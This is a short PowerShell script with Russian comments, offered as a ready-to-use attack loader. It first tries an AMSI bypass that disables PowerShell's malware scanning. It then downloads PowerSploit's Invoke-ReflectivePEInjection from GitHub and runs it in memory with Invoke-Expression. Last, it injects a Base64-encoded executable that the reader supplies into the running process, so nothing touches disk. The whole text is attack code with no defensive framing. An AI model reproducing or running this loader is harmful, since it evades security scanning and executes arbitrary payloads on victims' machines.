# Базовый AMSI-байпас (обход сканирования PowerShell)
[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation.AmsiUtils') | Out-Null
[Runtime.InteropServices.Marshal]::WriteInt32([Reflection.Assembly]::GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext', 'NonPublic,Static').GetValue($null), [IntPtr]::Zero) | Out-Null

# Загружаем Invoke-ReflectivePEInjection из памяти (без скачивания на диск)
$scriptUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
$scriptContent = (New-Object System.Net.WebClient).DownloadString($scriptUrl)
Invoke-Expression $scriptContent

# Твой EXE в Base64 (ЗАМЕНИ НА СВОЙ)
$base64 = "" # <-- сюда твой Base64

# Декодируем
$peBytes = [Convert]::FromBase64String($base64)

# Выполняем в памяти текущего процесса PowerShell
Invoke-ReflectivePEInjection -PEBytes $peBytes -ForceASLR
